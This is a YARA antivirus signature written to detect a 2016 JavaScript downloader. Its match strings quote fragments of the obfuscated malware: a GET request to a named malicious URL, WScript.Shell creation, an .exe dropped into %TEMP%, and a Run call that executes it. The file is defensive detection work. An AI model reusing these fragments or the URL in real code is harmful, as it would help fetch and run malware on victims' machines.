rule sig_20160401_b4231b46ef5bc14f2afbf51d5305cbed {
  meta:
    description = "datamaliciousorder - file 20160401_b4231b46ef5bc14f2afbf51d5305cbed.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "709ca7b6665dd8a3528fbe8d89f5fbccb3821154a296950ece9514ce80afd76c"

  strings:
    $s1  = "GnVxx[PyAi](\"G\" + \"ET\", \"http://geetanjalifincorp.com/pqw9aso\", false);" fullword ascii
    $s2  = "var WrZc = function GnUj() {return WScript[LbJo](\"WScript\"+\".Shell\");}(), CsdEm = 11;" fullword ascii
    $s3  = "function KsNz(MvpNtx, DdQx){HawXmz = HawXmz * 1; return MvpNtx - DdQx;};" fullword ascii
    $s4  = "if (GnVxx[\"readystate\"] < 2 * 2) continue;" fullword ascii
    $s5  = "function MfcCr() {return WrZc[\"ExpandEnvironmentStrings\"](\"%TE\"+\"MP%/\") + \"CIzDtXGKC3ZwFhw.ex\" + \"e\";};" fullword ascii
    $s6  = "function YvaUi(){return MwmGth + \"\";};" fullword ascii
    $s7  = "function YbGs() {return ((LgVn == true) && (LgVn == NwMga)) ? 1 : HawXmz;};" fullword ascii
    $s8  = "function UyuYy(){return LbJo;};" fullword ascii
    $s9  = "var NwMga = false;" fullword ascii
    $s10 = "var LgQs = new this[\"Date\"]();" fullword ascii
    $s11 = "LgVn = true; " fullword ascii
    $s12 = "function NtyQci(){return 23;};" fullword ascii
    $s13 = "return KsNz(JlAe, EqCi);" fullword ascii
    $s14 = "NwMga = true; " fullword ascii
    $s15 = "var LgVn = false;" fullword ascii
    $s16 = "function EmsCjk(FeWg){WrZc[\"R\"+\"un\"](FeWg, HawXmz, HawXmz);};" fullword ascii
    $s17 = "}while (HcPfl);" fullword ascii
    $s18 = "function XjkRw(RiDeu) {var WnwJuf = (1, 2, 3, 4, 5, RiDeu); return WnwJuf;};" fullword ascii
    $s19 = "var WhfAyd = false;" fullword ascii
    $s20 = "function AdyLn()" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}